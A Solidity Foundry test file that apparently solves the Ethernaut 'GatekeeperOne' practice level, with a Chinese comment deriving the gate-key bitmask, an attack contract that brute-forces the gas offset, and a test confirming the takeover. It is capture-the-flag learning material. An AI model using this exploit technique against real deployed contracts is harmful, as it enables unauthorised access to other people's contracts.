// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";

/*  
contract GatekeeperOne

uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
uint32(uint64(_gateKey)) != uint64(_gateKey)
uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))

=>

0x B1 B2 B3 B4 B5 B6 B7 B8

假设 k = uint64(_gateKey)

uint32(k) == uint16(k)
uint32(k) != k
uint32(k) == uint16(uint160(tx.origin))

第1个条件
// uint32(k) == uint16(k)
B5 B6 B7 B8 == 0x 00 00 B7 B8 => 
B5 B6 将为 0

第2个条件
// uint32(k) != k
00 00 00 00 B5 B6 B7 B8 != 0x B1 B2 B3 B4 B5 B6 B7 B8 =>
B1 B2 B3 B4 不能为0

第3个条件
// uint32(k) = uint16(tx.origin)
0x B5 B6 B7 B8 == 0x 00 00 (last two bytes of tx.origin) =>
B7 B8 为 tx.origin

总结
0x xx xx xx xx 00 00 tx_origin tx_origin
bytes8 _gateKey = bytes8(solidity) & 0xFFFFFFFF0000FFFF;

这里使用位掩码技术 除了要求的位置为0 其他都保留原来的
*/

contract GatekeeperOneAttack {
    function enter(address _target) external {
        GatekeeperOne target = GatekeeperOne(_target);
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        for (uint256 i = 0; i < 1000; i++) {
            (bool success,) =
                address(target).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}

contract GatekeeperOneTest is Test {
    GatekeeperOne public gt1;
    GatekeeperOneAttack gtAttack;

    address alice = makeAddr("alice");

    function setUp() public {
        gt1 = new GatekeeperOne();
        gtAttack = new GatekeeperOneAttack();
    }

    function testAttack() public {
        assertEq(gt1.entrant(), address(0));

        vm.prank(alice, alice);
        gtAttack.enter(address(gt1));

        assertEq(gt1.entrant(), alice);
    }
}
